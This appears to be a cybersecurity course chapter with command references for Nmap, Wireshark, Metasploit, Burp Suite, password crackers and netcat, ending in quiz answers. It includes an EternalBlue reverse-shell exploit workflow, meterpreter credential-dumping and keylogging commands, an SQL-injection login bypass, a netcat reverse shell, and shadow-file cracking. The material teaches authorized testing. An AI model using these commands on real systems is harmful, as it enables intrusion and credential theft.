# 10. Security Tools (In-Depth)

## Table of Contents
- [10.1 Nmap (Network Scanner)](#101-nmap-network-scanner)
- [10.2 Wireshark (Packet Analyzer)](#102-wireshark-packet-analyzer)
- [10.3 Metasploit (Exploitation Framework)](#103-metasploit-exploitation-framework)
- [10.4 Burp Suite (Web App Testing)](#104-burp-suite-web-app-testing)
- [10.5 John the Ripper & Hashcat (Password Cracking)](#105-john-the-ripper--hashcat-password-cracking)
- [10.6 Other Essential Tools](#106-other-essential-tools)
- [10.7 Common Mistakes & Interview Tips](#107-common-mistakes--interview-tips)
- [10.8 Practice & Assessment](#108-practice--assessment)

---

## 10.1 Nmap (Network Scanner)

### What is Nmap?
**Nmap** (Network Mapper) is the industry-standard tool for network discovery and security auditing. It discovers hosts, open ports, services, OS versions, and vulnerabilities.

### Complete Command Reference

```bash
# ═══════════════════════════════════════
# HOST DISCOVERY
# ═══════════════════════════════════════
nmap -sn 192.168.1.0/24              # Ping sweep (no port scan)
nmap -Pn 192.168.1.100               # Skip ping (scan even if host seems down)
nmap -sn -PR 192.168.1.0/24          # ARP discovery (LAN only, very reliable)

# ═══════════════════════════════════════
# SCAN TYPES
# ═══════════════════════════════════════
sudo nmap -sS 192.168.1.100          # SYN scan (stealth, default with root)
nmap -sT 192.168.1.100               # TCP connect (full handshake, no root needed)
sudo nmap -sU 192.168.1.100          # UDP scan (slow)
sudo nmap -sA 192.168.1.100          # ACK scan (detect firewall rules)
nmap -sN 192.168.1.100               # NULL scan (no flags set)
nmap -sF 192.168.1.100               # FIN scan
nmap -sX 192.168.1.100               # Xmas scan (FIN+PSH+URG)

# ═══════════════════════════════════════
# PORT SPECIFICATION
# ═══════════════════════════════════════
nmap -p 22 192.168.1.100             # Single port
nmap -p 22,80,443 192.168.1.100      # Multiple ports
nmap -p 1-1000 192.168.1.100         # Port range
nmap -p- 192.168.1.100               # ALL 65535 ports
nmap --top-ports 100 192.168.1.100   # Top 100 common ports

# ═══════════════════════════════════════
# SERVICE & OS DETECTION
# ═══════════════════════════════════════
nmap -sV 192.168.1.100               # Service/version detection
nmap -sV --version-intensity 5       # More aggressive version detection
sudo nmap -O 192.168.1.100           # OS detection
nmap -A 192.168.1.100                # Aggressive: OS + version + scripts + traceroute

# ═══════════════════════════════════════
# NSE SCRIPTS
# ═══════════════════════════════════════
nmap --script vuln 192.168.1.100                    # All vulnerability scripts
nmap --script http-enum 192.168.1.100               # Web directory enumeration
nmap --script smb-vuln-ms17-010 192.168.1.100       # EternalBlue check
nmap --script ssl-enum-ciphers -p 443 target.com    # TLS cipher check
nmap --script banner -p 22,80 192.168.1.100         # Banner grabbing
nmap --script default 192.168.1.100                 # Safe default scripts

# ═══════════════════════════════════════
# OUTPUT
# ═══════════════════════════════════════
nmap -oN scan.txt 192.168.1.100      # Normal output
nmap -oX scan.xml 192.168.1.100      # XML output
nmap -oG scan.gnmap 192.168.1.100    # Grepable output
nmap -oA scan_all 192.168.1.100      # All formats

# ═══════════════════════════════════════
# TIMING & EVASION
# ═══════════════════════════════════════
nmap -T0 192.168.1.100               # Paranoid (very slow, IDS evasion)
nmap -T1 192.168.1.100               # Sneaky
nmap -T2 192.168.1.100               # Polite
nmap -T3 192.168.1.100               # Normal (default)
nmap -T4 192.168.1.100               # Aggressive (recommended for labs)
nmap -T5 192.168.1.100               # Insane (may miss results)

# Fragment packets (firewall evasion)
nmap -f 192.168.1.100

# Decoy scan (hide among fake IPs)
nmap -D RND:10 192.168.1.100
```

### Sample Output Explained

```
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 7.9p1 Debian    ← SSH accessible
80/tcp   open     http     Apache httpd 2.4.38     ← Web server
443/tcp  open     ssl/http Apache httpd 2.4.38     ← HTTPS
3306/tcp open     mysql    MySQL 5.7.33            ← DB exposed! Risk!
8080/tcp filtered http     —                        ← Firewall blocking

Port States:
  open     → Port accepting connections
  closed   → Port reachable but no service listening
  filtered → Firewall blocking (can't determine if open/closed)
```

---

## 10.2 Wireshark (Packet Analyzer)

### What is Wireshark?
**Wireshark** captures and analyzes network traffic in real-time. You can see every packet flowing through your network interface.

### Capture Filters (Applied BEFORE capture)

```
# Capture only traffic to/from specific IP
host 192.168.1.100

# Capture only specific port
port 80
port 443

# Capture specific protocol
tcp
udp
icmp

# Combine filters
host 192.168.1.100 and port 80
src host 192.168.1.50 and dst port 443
```

### Display Filters (Applied AFTER capture)

```
# Filter by protocol
http
dns
tcp
tls
arp
icmp

# Filter by IP
ip.addr == 192.168.1.100
ip.src == 192.168.1.50
ip.dst == 192.168.1.100

# Filter by port
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# HTTP specific
http.request.method == "POST"
http.request.uri contains "login"
http.response.code == 200
http.response.code == 401

# TCP flags
tcp.flags.syn == 1                    # SYN packets
tcp.flags.syn == 1 && tcp.flags.ack == 0   # SYN only (new connections)
tcp.flags.rst == 1                    # Reset packets

# Find passwords (HTTP only — HTTPS is encrypted)
http.request.method == "POST" && http contains "password"

# DNS queries
dns.qry.name == "evil.com"
dns.qry.type == 1                     # A records
```

### What to Look For (Security Analysis)

| Pattern | Possible Attack | Filter |
|---------|----------------|--------|
| Many SYN packets, no ACK | SYN Flood (DoS) | `tcp.flags.syn==1 && tcp.flags.ack==0` |
| ARP responses from multiple MACs | ARP Spoofing (MITM) | `arp` |
| DNS responses with unusual IPs | DNS Spoofing | `dns.flags.response==1` |
| HTTP POST with credentials | Credential capture (insecure) | `http.request.method=="POST"` |
| Large data transfer outbound | Data exfiltration | `ip.src==internal_ip && frame.len>1000` |
| Unusual DNS queries | DNS tunneling | `dns && frame.len>200` |

### Command-Line Alternative: tcpdump

```bash
# Capture all traffic
sudo tcpdump -i eth0

# Capture specific host
sudo tcpdump -i eth0 host 192.168.1.100

# Capture specific port
sudo tcpdump -i eth0 port 80

# Save to file (open in Wireshark later)
sudo tcpdump -i eth0 -w capture.pcap

# Read saved capture
tcpdump -r capture.pcap

# Verbose with ASCII output
sudo tcpdump -i eth0 -A port 80
```

---

## 10.3 Metasploit (Exploitation Framework)

### What is Metasploit?
**Metasploit** is the world's most popular penetration testing framework. It contains exploits, payloads, and post-exploitation tools.

### Architecture

```
┌─────────────────────────────────────┐
│           METASPLOIT                 │
├──────────────┬──────────────────────┤
│  Exploits    │ Code that targets a  │
│              │ specific vulnerability│
├──────────────┼──────────────────────┤
│  Payloads    │ Code that runs after │
│              │ exploitation         │
│  └ Meterpreter │ Advanced shell     │
│  └ Reverse Shell│ Connect back      │
│  └ Bind Shell   │ Listen on target  │
├──────────────┼──────────────────────┤
│  Auxiliary   │ Scanning, fuzzing,   │
│              │ sniffing modules     │
├──────────────┼──────────────────────┤
│  Post        │ Post-exploitation    │
│              │ modules              │
├──────────────┼──────────────────────┤
│  Encoders    │ Evade detection      │
└──────────────┴──────────────────────┘
```

### Basic Workflow

```bash
# Start Metasploit
msfconsole

# 1. Search for exploit
msf6> search eternalblue
msf6> search type:exploit name:apache
msf6> search cve:2021-44228        # Log4Shell

# 2. Select exploit
msf6> use exploit/windows/smb/ms17_010_eternalblue

# 3. View options
msf6> show options
msf6> show payloads

# 4. Configure
msf6> set RHOSTS 192.168.1.100     # Target IP
msf6> set LHOST 192.168.1.50       # Your IP
msf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 5. Verify settings
msf6> show options

# 6. Execute
msf6> exploit
# or
msf6> run
```

### Meterpreter Commands

```bash
# System info
meterpreter> sysinfo                 # OS, architecture, hostname
meterpreter> getuid                  # Current user
meterpreter> getpid                  # Process ID

# Privilege escalation
meterpreter> getsystem               # Try to get SYSTEM

# File operations
meterpreter> ls                      # List files
meterpreter> cd C:\\Users            # Change directory
meterpreter> download secret.txt     # Download file
meterpreter> upload tool.exe         # Upload file
meterpreter> cat C:\\flag.txt        # Read file

# Credential harvesting
meterpreter> hashdump                # Dump password hashes
meterpreter> load kiwi               # Load Mimikatz
meterpreter> creds_all               # Dump all credentials

# Network
meterpreter> ipconfig                # Network configuration
meterpreter> arp                     # ARP table
meterpreter> route                   # Routing table
meterpreter> portfwd add -l 8080 -p 80 -r 10.0.0.5  # Port forwarding

# Surveillance
meterpreter> screenshot              # Capture screen
meterpreter> keyscan_start           # Start keylogger
meterpreter> keyscan_dump            # Read keystrokes
meterpreter> webcam_snap             # Camera capture

# Pivoting
meterpreter> run autoroute -s 10.0.0.0/24  # Route through compromised host
```

---

## 10.4 Burp Suite (Web App Testing)

### What is Burp Suite?
**Burp Suite** is the leading tool for web application security testing. It acts as a proxy between your browser and the target, allowing you to intercept, modify, and replay requests.

### Setup

```
1. Start Burp Suite
2. Go to Proxy → Options → Confirm listener on 127.0.0.1:8080
3. Configure browser proxy:
   - Firefox: Settings → Network → Manual Proxy → 127.0.0.1:8080
   - Or use FoxyProxy extension
4. For HTTPS: Install Burp's CA certificate
   → Navigate to http://burp → download CA cert → import into browser
```

### Key Components

| Tab | Purpose | Use Case |
|-----|---------|----------|
| **Proxy** | Intercept/modify requests | See what browser sends, modify on-the-fly |
| **Repeater** | Resend modified requests | Test SQLi, XSS, parameter tampering |
| **Intruder** | Automated parameter fuzzing | Brute force, wordlist attacks |
| **Scanner** | Automated vulnerability scanning | Find SQLi, XSS, etc. (Pro version) |
| **Decoder** | Encode/decode data | Base64, URL encoding, HTML entities |
| **Comparer** | Compare two responses | Spot differences in blind testing |

### Testing Workflow

```
1. Browse target → Traffic captured in Proxy → HTTP History
2. Find interesting request (login, search, API call)
3. Right-click → Send to Repeater
4. Modify parameters → Send → Analyze response
5. If vulnerable → Right-click → Send to Intruder
6. Set payload positions → Configure wordlist → Start attack
7. Analyze results (response length, status codes)
```

### Example: Testing for SQLi with Burp

```
Original request:
  POST /login HTTP/1.1
  username=admin&password=test123

In Repeater, modify to:
  username=admin' OR '1'='1' --&password=anything

If response shows "Welcome admin" → SQL Injection confirmed!
```

---

## 10.5 John the Ripper & Hashcat (Password Cracking)

### John the Ripper

```bash
# Crack Linux password hashes
sudo unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt

# Use specific wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt

# Show cracked passwords
john --show combined.txt

# Specify hash format
john --format=raw-md5 hashes.txt
john --format=raw-sha256 hashes.txt
john --format=NT hashes.txt          # Windows NTLM

# Incremental (brute force) mode
john --incremental hashes.txt
```

### Hashcat

```bash
# Hashcat is GPU-accelerated = MUCH faster

# Basic syntax: hashcat -m <mode> -a <attack> hash wordlist

# Common hash modes (-m):
#   0    = MD5
#   100  = SHA1
#   1400 = SHA256
#   1000 = NTLM (Windows)
#   1800 = SHA-512 (Linux)
#   3200 = bcrypt
#   5600 = NetNTLMv2

# Attack modes (-a):
#   0 = Straight (wordlist)
#   1 = Combination
#   3 = Brute force (mask)
#   6 = Wordlist + mask

# Examples
hashcat -m 0 -a 0 md5_hashes.txt rockyou.txt          # MD5 + wordlist
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt      # NTLM + wordlist
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a                # MD5 brute force 6 chars
hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64 # With rules

# Show results
hashcat -m 0 hash.txt --show
```

---

## 10.6 Other Essential Tools

### Quick Reference

| Tool | Purpose | Category |
|------|---------|----------|
| `netcat (nc)` | Network Swiss army knife | Networking |
| `sqlmap` | Automated SQL injection | Web |
| `gobuster` | Directory/DNS brute force | Web recon |
| `nikto` | Web server scanner | Web |
| `aircrack-ng` | Wi-Fi security testing | Wireless |
| `responder` | LLMNR/NBNS poisoning | Network |
| `bloodhound` | Active Directory mapping | Windows |
| `mimikatz` | Windows credential extraction | Post-exploitation |
| `enum4linux` | SMB/NetBIOS enumeration | Enumeration |
| `searchsploit` | Offline exploit database | Research |

### Netcat — The Network Swiss Army Knife

```bash
# Connect to a port (like telnet)
nc 192.168.1.100 80

# Listen on a port
nc -lvnp 4444

# File transfer
# Receiver:
nc -lvnp 4444 > received_file.txt
# Sender:
nc 192.168.1.50 4444 < file_to_send.txt

# Reverse shell (attacker listens, victim connects back)
# Attacker: nc -lvnp 4444
# Victim:   nc 192.168.1.50 4444 -e /bin/bash

# Port scanning
nc -zv 192.168.1.100 1-1000
```

### Searchsploit (Offline Exploit Database)

```bash
# Search for exploits
searchsploit apache 2.4
searchsploit openssh 7.9
searchsploit windows smb

# View exploit details
searchsploit -x exploits/linux/remote/47163.py

# Copy exploit to current directory
searchsploit -m exploits/linux/remote/47163.py
```

---

## 10.7 Common Mistakes & Interview Tips

### Common Mistakes

| Mistake | Fix |
|---------|-----|
| Running Nmap without permission | Always have written authorization |
| Using `-T5` on production networks | Use `-T3` or `-T4`; `-T5` is unreliable |
| Not saving scan results | Always use `-oA` for all output formats |
| Relying only on automated scanners | Manual testing catches logic flaws |
| Using tools without understanding output | Learn what each result means |

### Interview Questions

**Q: What is the difference between -sS and -sT in Nmap?**
> `-sS` is a SYN scan (half-open, stealthier, needs root). `-sT` is a full TCP connect scan (completes the handshake, no root needed, more visible in logs).

**Q: What is Meterpreter?**
> Meterpreter is Metasploit's advanced payload that runs entirely in memory. It provides a command shell with features like file transfer, screenshot, keylogging, credential dumping, and pivoting.

**Q: How does Burp Suite work?**
> Burp Suite acts as a proxy between the browser and the target. It intercepts HTTP/HTTPS traffic, allowing you to inspect, modify, and replay requests for security testing.

**Q: What is the difference between John the Ripper and Hashcat?**
> Both are password cracking tools. John is CPU-based and good for quick attacks. Hashcat is GPU-accelerated and significantly faster for large hash sets.

---

## 10.8 Practice & Assessment

### MCQs

**Q1.** Which Nmap flag performs service version detection?
- A) `-sS`
- B) `-sV`
- C) `-O`
- D) `-sn`

**Answer:** B) `-sV`

---

**Q2.** In Wireshark, which display filter shows only HTTP POST requests?
- A) `tcp.port == 80`
- B) `http.request`
- C) `http.request.method == "POST"`
- D) `http contains "POST"`

**Answer:** C) `http.request.method == "POST"`

---

**Q3.** In Metasploit, `RHOSTS` refers to:
- A) Attacker's IP address
- B) Target's IP address
- C) Router's IP address
- D) DNS server

**Answer:** B) Target's IP address

---

**Q4.** Hashcat is faster than John because:
- A) It has more exploits
- B) It uses GPU acceleration
- C) It uses a different algorithm
- D) It works online

**Answer:** B) It uses GPU acceleration

---

### Tool-Based Exercises

**Exercise 1:** Run an Nmap scan against a practice target (e.g., scanme.nmap.org — authorized for scanning). Identify open ports, services, and OS.

**Exercise 2:** Capture HTTP traffic in Wireshark while browsing a non-HTTPS website. Find the requested URLs in the capture.

**Exercise 3:** Use John the Ripper to crack this MD5 hash: `5f4dcc3b5aa765d61d8327deb882cf99` (hint: it's a very common password).

---

> **Next Topic:** [11 - Vulnerability Assessment & Penetration Testing](11-vapt.md)
